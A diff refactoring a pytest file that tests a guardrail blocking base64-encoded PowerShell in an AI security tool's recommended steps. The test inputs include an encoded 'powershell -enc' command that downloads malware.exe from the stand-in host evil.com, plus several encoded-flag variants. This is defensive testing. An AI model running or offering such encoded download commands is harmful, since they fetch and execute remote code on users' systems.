@@ -1,96 +1,63 @@
-"""Test the new base64 PowerShell pattern."""
+﻿"""
+Usage:
+  pytest tests/test_new_pattern.py
 
-# Allow running from tests/ by adding parent dir to sys.path
-import os
-import sys
+Purpose:
+  Validate the base64 PowerShell guardrail pattern in security.py.
 
-sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
+Limitations:
+  - Uses synthetic strings; does not parse real event logs.
+"""
 
 import json
 
-from src.schemas import AnalysisOutput
+import pytest
+
 from src.security import validate_output
 
-# Test Case 1: Clean recommendation (should pass)
-clean_data = {
-    "status": "success",
-    "findings": [],
-    "hypotheses": [],
-    "indicators_of_compromise": [],
-    "recommended_next_steps": [
-        "Review process tree for suspicious activity",
-        "Check authentication logs for failed logins",
-    ],
-    "confidence": 0.85,
-}
 
-validated = AnalysisOutput.model_validate(clean_data)
-# Convert to JSON string (how main.py calls it)
-response_text = json.dumps(clean_data, ensure_ascii=False)
-is_valid, error_msg = validate_output(response_text)
-print(f"Test 1 (Clean): Valid={is_valid}, Error={error_msg}")
-assert is_valid, "Clean data should pass!"
-
-# Test Case 2: Base64-encoded PowerShell (should fail)
-encoded_ps_data = {
-    "status": "success",
-    "findings": [],
-    "hypotheses": [],
-    "indicators_of_compromise": [],
-    "recommended_next_steps": [
-        (
-            "Run powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8A"
-            "LwBlAHYAaQBsAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGU="
-        )
-    ],
-    "confidence": 0.85,
-}
-
-validated = AnalysisOutput.model_validate(encoded_ps_data)
-response_text = json.dumps(encoded_ps_data, ensure_ascii=False)
-is_valid, error_msg = validate_output(response_text)
-print(f"Test 2 (Base64 PS): Valid={is_valid}, Error={error_msg}")
-if not is_valid:
-    print(f"  → Blocked! Error: {error_msg}")
-assert not is_valid, "Base64 PowerShell should be blocked!"
-
-# Test Case 3: Multiple encoding flags (should fail)
-test_cases = [
-    "pwsh.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
-    "POWERSHELL -e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
-    "powershell.exe -ec VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
-]
-
-for idx, test_cmd in enumerate(test_cases, 3):
-    test_data = {
+def _payload(next_steps: list[str]) -> str:
+    data = {
         "status": "success",
         "findings": [],
         "hypotheses": [],
         "indicators_of_compromise": [],
-        "recommended_next_steps": [test_cmd],
+        "recommended_next_steps": next_steps,
         "confidence": 0.85,
     }
+    return json.dumps(data, ensure_ascii=False)
 
-    response_text = json.dumps(test_data, ensure_ascii=False)
-    is_valid, error_msg = validate_output(response_text)
-    print(f"Test {idx}: Valid={is_valid}")
-    assert not is_valid, f"Test case {idx} should be blocked!"
 
-# Test Case 4: Normal PowerShell (should pass - not base64)
-normal_ps_data = {
-    "status": "success",
-    "findings": [],
-    "hypotheses": [],
-    "indicators_of_compromise": [],
-    "recommended_next_steps": [
-        "Run powershell Get-Process to check for suspicious processes"
+def test_guardrail_allows_clean_text() -> None:
+    response_text = _payload(
+        [
+            "Review process tree for suspicious activity",
+            "Check authentication logs for failed logins",
+        ]
+    )
+    is_valid, _ = validate_output(response_text)
+    assert is_valid
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        (
+            "Run powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8A"
+            "LwBlAHYAaQBsAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGU="
+        ),
+        "pwsh.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
+        "POWERSHELL -e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
+        "powershell.exe -ec VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
     ],
-    "confidence": 0.85,
-}
+)
+def test_guardrail_blocks_base64_powershell(cmd: str) -> None:
+    response_text = _payload([cmd])
+    is_valid, _ = validate_output(response_text)
+    assert not is_valid
 
-response_text = json.dumps(normal_ps_data, ensure_ascii=False)
-is_valid, error_msg = validate_output(response_text)
-print(f"Test 4 (Normal PS): Valid={is_valid}, Error={error_msg}")
-assert is_valid, "Normal PowerShell commands should pass!"
 
-print("\n✅ All tests passed! Your new pattern works correctly.")
+def test_guardrail_allows_normal_powershell() -> None:
+    response_text = _payload(["Run powershell Get-Process to check for suspicious processes"])
+    is_valid, _ = validate_output(response_text)
+    assert is_valid
